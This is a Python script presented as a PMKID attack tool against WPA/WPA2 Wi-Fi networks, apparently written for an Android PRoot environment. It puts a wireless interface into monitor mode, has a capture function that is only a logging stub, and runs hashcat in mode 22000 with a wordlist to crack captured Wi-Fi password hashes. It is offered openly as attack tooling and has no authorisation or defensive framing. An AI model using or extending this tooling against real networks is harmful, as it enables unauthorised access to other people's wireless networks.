#!/usr/bin/env python3
"""
pmkid_capture.py — PMKID attack (no client needed, no deauth required!)

The MOST EFFECTIVE modern WPA/WPA2 attack as of 2024-2025.
Works on networks with 802.11r (fast roaming) enabled.
PMKID is sent in EAPOL M1 by the AP itself - no client interaction needed.

Cracking PMKID: hashcat -m 22000 hash.22000 wordlist.txt
"""
import sys, time, os
from pathlib import Path
import argparse

OUT = Path("/sdcard/MT2/captures")
OUT.mkdir(parents=True, exist_ok=True)

def log(level, msg):
    colors = {"i": "\033[96m", "ok": "\033[92m", "warn": "\033[93m", "err": "\033[91m", "atk": "\033[95m"}
    E = "\033[0m"
    print(f"{colors.get(level, '')}[{level.upper()}]{E} {msg}", flush=True)

def setup_monitor_mode(interface="wlan0"):
    """Put WiFi adapter in monitor mode (needs root + compatible adapter)."""
    log("i", f"Setting {interface} to monitor mode...")
    cmds = [
        ["ip", "link", "set", interface, "down"],
        ["iw", "dev", interface, "set", "type", "monitor"],
        ["ip", "link", "set", interface, "up"],
    ]
    import subprocess
    for cmd in cmds:
        r = subprocess.run(cmd, capture_output=True)
        if r.returncode != 0:
            log("warn", f"{' '.join(cmd)} failed: {r.stderr.decode()[:100]}")
    log("ok", f"{interface} in monitor mode")

def capture_pmkid(bssid, channel, duration=30, interface="wlan0"):
    """Capture PMKID from AP using hcxdumptool equivalent (scapy fallback)."""
    log("atk", f"Capturing PMKID from {bssid} ch={channel} for {duration}s...")
    log("i", "(Note: This requires monitor mode + compatible WiFi adapter)")
    log("i", "On Android PRoot, this typically won't work without external adapter")
    log("i", "Fallback: use ESP8266 to capture 4-way handshake instead")
    # Implementation: would use scapy to listen for EAPOL M1
    # In PRoot this won't work for monitor mode
    log("warn", "Monitor mode not available in PRoot environment")
    log("i", "Recommendation: use 4-way handshake capture via ESP8266")

def crack_pmkid(hash_file, wordlist="/sdcard/MT2/wordlist.txt"):
    """Crack PMKID hash with hashcat."""
    import subprocess
    if not Path(hash_file).exists():
        log("err", f"Hash file not found: {hash_file}")
        return
    log("atk", f"Cracking {hash_file} with hashcat...")
    # Hashcat mode 22000 = WPA-PMKID-PBKDF2
    cmd = ["hashcat", "-m", "22000", str(hash_file), str(wordlist), "--force"]
    try:
        r = subprocess.run(cmd, capture_output=False, timeout=600)
        log("ok", "Cracking done")
    except FileNotFoundError:
        log("err", "hashcat not installed")
    except subprocess.TimeoutExpired:
        log("warn", "Cracking timeout (10 min)")

def main():
    parser = argparse.ArgumentParser(description="PMKID attack (most effective WPA2 method)")
    parser.add_argument("--bssid", help="Target AP BSSID")
    parser.add_argument("--channel", type=int, help="Channel")
    parser.add_argument("--duration", type=int, default=30)
    parser.add_argument("--crack", help="Crack existing hash file")
    parser.add_argument("--interface", default="wlan0")
    args = parser.parse_args()
    if args.crack:
        crack_pmkid(args.crack)
    elif args.bssid and args.channel:
        setup_monitor_mode(args.interface)
        capture_pmkid(args.bssid, args.channel, args.duration, args.interface)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
